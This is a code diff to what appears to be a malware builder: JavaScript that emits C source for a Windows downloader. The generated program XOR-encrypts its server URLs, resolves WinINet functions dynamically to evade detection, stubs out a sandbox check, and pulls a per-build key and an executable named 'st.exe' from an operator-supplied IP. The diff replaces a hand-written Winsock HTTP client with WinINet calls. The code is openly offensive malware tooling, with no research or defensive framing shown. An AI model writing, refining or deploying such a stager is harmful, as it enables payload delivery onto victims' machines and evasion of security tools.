@@ -64,7 +64,6 @@ export function randomBuildMeta(seed) {
   };
 }
 
-// Fixed: Do not encrypt the null terminator
 function encryptStr(str, key) {
   const buf = Buffer.from(str, 'ascii');
   const enc = [];
@@ -75,15 +74,14 @@ function encryptStr(str, key) {
 }
 
 function cSource(meta, ip, buildId) {
+  const keyUrl = `http://${ip}/api/getkey/${buildId}`;
+  const stUrl  = `http://${ip}/api/downloads/st.exe`;
   const esc4c  = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
-  const encIp = encryptStr(ip, meta.xorKey);
-  const encKeyPath = encryptStr(`/api/getkey/${buildId}`, meta.xorKey);
-  const encStPath = encryptStr(`/api/downloads/st.exe`, meta.xorKey);
+  const encKeyUrl = encryptStr(keyUrl, meta.xorKey);
+  const encStUrl  = encryptStr(stUrl, meta.xorKey);
 
   return String.raw`
 #include <windows.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
 #include <shlobj.h>
 #include <stdio.h>
 #include <wchar.h>
@@ -94,16 +92,10 @@ static void decrypt(char* buf, int len, unsigned char key) {
 }
 
 // ── dynamic API resolution ─────────────────────────────────────────────────
-typedef int (WSAAPI *pWSAStartup)(WORD, void*);
-typedef int (WSAAPI *pWSACleanup)(void);
-typedef SOCKET (WSAAPI *pSocket)(int, int, int);
-typedef int (WSAAPI *pConnect)(SOCKET, const struct sockaddr*, int);
-typedef int (WSAAPI *pSend)(SOCKET, const char*, int, int);
-typedef int (WSAAPI *pRecv)(SOCKET, char*, int, int);
-typedef int (WSAAPI *pClosesocket)(SOCKET);
-typedef int (WSAAPI *pSetsockopt)(SOCKET, int, int, const char*, int);
-typedef int (WSAAPI *pGetAddrInfo)(const char*, const char*, const struct addrinfo*, struct addrinfo**);
-typedef void (WSAAPI *pFreeAddrInfo)(struct addrinfo*);
+typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
+typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
+typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
 
 static void log_msg(const wchar_t* msg) {
     wchar_t appdata[MAX_PATH], path[MAX_PATH];
@@ -147,104 +139,44 @@ static int is_valid_pe(const wchar_t* p) {
     return 1;
 }
 
-// ── http downloader via dynamic winsock ────────────────────────────────────
-static int http_get(const char* host, const char* path, const wchar_t* dest) {
-    HMODULE hWs2 = LoadLibraryA("ws2_32.dll");
-    if (!hWs2) { log_msg(L"Failed to load ws2_32.dll"); return 0; }
+static int download_file(const char* url, const wchar_t* dest) {
+    HMODULE hWinInet = LoadLibraryA("wininet.dll");
+    if (!hWinInet) { log_msg(L"Failed to load wininet.dll"); return 0; }
 
-    pWSAStartup wsaStartup = (pWSAStartup)GetProcAddress(hWs2, "WSAStartup");
-    pWSACleanup wsaCleanup = (pWSACleanup)GetProcAddress(hWs2, "WSACleanup");
-    pSocket sockFunc = (pSocket)GetProcAddress(hWs2, "socket");
-    pConnect connectFunc = (pConnect)GetProcAddress(hWs2, "connect");
-    pSend sendFunc = (pSend)GetProcAddress(hWs2, "send");
-    pRecv recvFunc = (pRecv)GetProcAddress(hWs2, "recv");
-    pClosesocket closeFunc = (pClosesocket)GetProcAddress(hWs2, "closesocket");
-    pSetsockopt setsockoptFunc = (pSetsockopt)GetProcAddress(hWs2, "setsockopt");
-    pGetAddrInfo getAddrInfo = (pGetAddrInfo)GetProcAddress(hWs2, "getaddrinfo");
-    pFreeAddrInfo freeAddrInfo = (pFreeAddrInfo)GetProcAddress(hWs2, "freeaddrinfo");
+    pInternetOpenA InternetOpenA = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
+    pInternetOpenUrlA InternetOpenUrlA = (pInternetOpenUrlA)GetProcAddress(hWinInet, "InternetOpenUrlA");
+    pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");
+    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)GetProcAddress(hWinInet, "InternetCloseHandle");
 
-    if (!wsaStartup || !sockFunc || !connectFunc || !getAddrInfo) return 0;
+    if (!InternetOpenA || !InternetOpenUrlA || !InternetReadFile || !InternetCloseHandle) return 0;
 
-    unsigned char wsaData[400];
-    if (wsaStartup(0x0202, wsaData) != 0) { log_msg(L"WSAStartup failed"); return 0; }
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", 1, NULL, NULL, 0);
+    if (!hInternet) { log_msg(L"InternetOpenA failed"); return 0; }
 
-    struct addrinfo hints = {0}, *res = NULL;
-    hints.ai_family = AF_INET;
-    hints.ai_socktype = SOCK_STREAM;
-    
-    if (getAddrInfo(host, "80", &hints, &res) != 0) { log_msg(L"getaddrinfo failed"); wsaCleanup(); return 0; }
-
-    SOCKET sock = sockFunc(res->ai_family, res->ai_socktype, res->ai_protocol);
-    if (sock == INVALID_SOCKET) { freeAddrInfo(res); wsaCleanup(); return 0; }
-
-    DWORD timeout = 10000;
-    setsockoptFunc(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
-
-    if (connectFunc(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
-        log_msg(L"connect failed");
-        closeFunc(sock); freeAddrInfo(res); wsaCleanup(); return 0;
-    }
-    freeAddrInfo(res);
-
-    char req[1024];
-    _snprintf(req, sizeof(req),
-        "GET %s HTTP/1.0\r\n"
-        "Host: %s\r\n"
-        "User-Agent: Mozilla/5.0\r\n"
-        "Accept: */*\r\n\r\n", path, host);
-
-    if (sendFunc(sock, req, (int)strlen(req), 0) == SOCKET_ERROR) {
-        log_msg(L"send failed");
-        closeFunc(sock); wsaCleanup(); return 0;
-    }
-
-    char buf[8192];
-    int bytes = 0;
-    int header_done = 0;
-    char h_buf[4] = {0};
-    char header_acc[4096] = {0};
-    int header_acc_len = 0;
-    int content_length = -1;
-    int total_written = 0;
+    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 0, 0);
+    if (!hUrl) { log_msg(L"InternetOpenUrlA failed"); InternetCloseHandle(hInternet); return 0; }
 
     HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) { closeFunc(sock); wsaCleanup(); return 0; }
+    if (hFile == INVALID_HANDLE_VALUE) { InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return 0; }
 
-    while ((bytes = recvFunc(sock, buf, sizeof(buf), 0)) > 0) {
-        int offset = 0;
-        if (!header_done) {
-            for (int i = 0; i < bytes; i++) {
-                h_buf[0] = h_buf[1]; h_buf[1] = h_buf[2]; h_buf[2] = h_buf[3]; h_buf[3] = buf[i];
-                if (header_acc_len < sizeof(header_acc) - 1) header_acc[header_acc_len++] = buf[i];
-                if (h_buf[0]=='\r' && h_buf[1]=='\n' && h_buf[2]=='\r' && h_buf[3]=='\n') {
-                    header_done = 1; offset = i + 1; header_acc[header_acc_len] = '\0';
-                    char* cl = strstr(header_acc, "Content-Length:");
-                    if (cl) content_length = atoi(cl + 15);
-                    break;
-                }
-            }
-            if (!header_done) continue;
-        }
-        int to_write = bytes - offset;
-        if (content_length >= 0 && total_written + to_write > content_length) to_write = content_length - total_written;
-        if (to_write > 0) {
-            DWORD w = 0;
-            WriteFile(hFile, buf + offset, to_write, &w, NULL);
-            total_written += w;
-        }
-        if (content_length >= 0 && total_written >= content_length) break;
+    char buf[8192];
+    DWORD bytesRead = 0;
+    BOOL ok = TRUE;
+    while (ok) {
+        ok = InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead);
+        if (!ok || bytesRead == 0) break;
+        DWORD written = 0;
+        WriteFile(hFile, buf, bytesRead, &written, NULL);
     }
 
     CloseHandle(hFile);
-    closeFunc(sock);
-    wsaCleanup();
-    
-    return size_ok(dest, 10);
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+    return 1;
 }
 
-// ── BYPASS FOR TESTING: Set to 0 to test instantly
 static int is_sandboxed(void) {
-    return 0; // <--- CHANGED TO 0 SO IT RUNS IMMEDIATELY ON YOUR VM
+    return 0; // Disabled for testing
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
@@ -271,21 +203,18 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     if (need_key || need_st) {
         log_msg(L"Starting download sequence...");
         
-        char ipStr[64] = {0};
-        char keyPathStr[128] = {0};
-        char stPathStr[128] = {0};
+        char keyUrlStr[128] = {0};
+        char stUrlStr[128] = {0};
 
-        const char encIp[] = ${encIp};
-        const char encKeyPath[] = ${encKeyPath};
-        const char encStPath[] = ${encStPath};
+        const char encKeyUrl[] = ${encKeyUrl};
+        const char encStUrl[] = ${encStUrl};
 
-        decrypt(ipStr, sizeof(encIp), ${meta.xorKey});
-        decrypt(keyPathStr, sizeof(encKeyPath), ${meta.xorKey});
-        decrypt(stPathStr, sizeof(encStPath), ${meta.xorKey});
+        decrypt(keyUrlStr, sizeof(encKeyUrl), ${meta.xorKey});
+        decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
 
         for (int i = 0; i < ${meta.retries} && (need_key || need_st); i++) {
             if (need_key) {
-                if (http_get(ipStr, keyPathStr, keyPath) && size_ok(keyPath, 10)) {
+                if (download_file(keyUrlStr, keyPath) && size_ok(keyPath, 10)) {
                     log_msg(L"Key downloaded OK");
                     need_key = 0;
                 } else {
@@ -294,7 +223,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
                 }
             }
             if (need_st) {
-                if (http_get(ipStr, stPathStr, stPath) && is_valid_pe(stPath)) {
+                if (download_file(stUrlStr, stPath) && is_valid_pe(stPath)) {
                     log_msg(L"st.exe downloaded OK");
                     need_st = 0;
                 } else {
